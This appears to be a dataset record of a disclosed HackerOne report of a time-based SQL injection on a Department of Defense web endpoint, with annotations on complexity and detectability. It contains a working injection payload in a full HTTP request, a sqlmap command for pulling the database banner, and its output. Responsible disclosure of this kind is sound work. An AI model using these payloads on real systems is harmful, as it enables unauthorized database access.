{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "sp1d3rs ",
  "title": "SQL Injection in the get_publications.php on the https://\u2588\u2588\u2588\u2588\u2588",
  "content": "\nDescription\nHello. I was able to find Time-based SQLI on the https://\u2588\u2588\u2588/pubs/get_publications.php using pub_group_id parameter\nPOC\nCode 768 Bytes\n1GET /pubs/get_publications.php?pub_group_id=wrtqvasi10rc19j1'%2b(select*from(select(sleep(5)))a)%2b'&rno86qi4=1 HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\n3Connection: keep-alive\n4Cache-Control: max-age=0\n5Upgrade-Insecure-Requests: 1\n6User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\n7Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\n8Referer: https://\u2588\u2588\u2588\u2588\u2588/pubs/\n9Accept-Encoding: gzip, deflate, br\n10Accept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7\n11Cookie: _ga=GA1.2.1697249984.1548431559; __utma=161700579.1697249984.1548431559.1548902867.1548902867.1; __utmz=161700579.1548902867.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); _test_cookie=0\n12\n13\nThis request will trigger the 5 sec delay of the response. By making sleep value as 10, request will be delayed for 10 seconds.\nAs additional POC, that attacker is able to extract data, and it's not a false-positive, I retrieved DB banner (version) only using sqlmap command:\nCode 95 Bytes\n1sqlmap.py -r test.txt --dbms=mysql --technique=T -p pub_group_id --banner --force-ssl --level=5\nwhere test.txt is a text fiile contained request dump above.\nResult:\nCode 23 Bytes\n15.5.62-0ubuntu0.14.04.1\n\u2588\u2588\u2588\u2588\u2588\nNo sensitive data such as databases, tables, or content was accessed.\nImpact\nSQL injection usually have high or critical impact.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "SQL Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1570216680,
  "report_url": "https://hackerone.com/reports/489483",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Identify the vulnerable parameter 'pub_group_id' in the URL: https://\u2588\u2588\u2588\u2588\u2588/pubs/get_publications.php"
    ],
    [
      2,
      "Inject a time-based SQL payload into the 'pub_group_id' parameter to trigger a delay in the response, e.g., 'wrtqvasi10rc19j1'%2b(select*from(select(sleep(5)))a)%2b''"
    ]
  ],
  "vuln_description": "A time-based SQL injection vulnerability exists in the 'pub_group_id' parameter of the get_publications.php endpoint. This allows an attacker to execute arbitrary SQL queries, potentially leading to unauthorized data access or database manipulation.",
  "reason": "The vulnerability involves a straightforward injection into a single parameter with a well-known SQL injection technique (time-based). No complex interactions or state manipulations are required.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "authnz_metadata": {
    "reason": "The SQL injection vulnerability involves manipulating the 'pub_group_id' parameter to trigger a time-based delay, which is not directly related to authentication or authorization bypass. The methodology described focuses on testing authorization boundaries by swapping user sessions and resource IDs, not on detecting SQL injection vulnerabilities.",
    "is_detectable": false
  },
  "injection_metadata": {
    "reasoning": "The reported SQL injection uses a time-based payload (sleep(5)) in the pub_group_id parameter. The methodology's 'simple payload' testing includes common SQLi payload permutations like time delays, which can be detected via response timing analysis (same channel). Since no custom filter bypasses are required and the payload's effect is observable through regular HTTP response timing (same channel), this vulnerability aligns with the methodology's detection capabilities.",
    "is_simple_injection": true
  }
}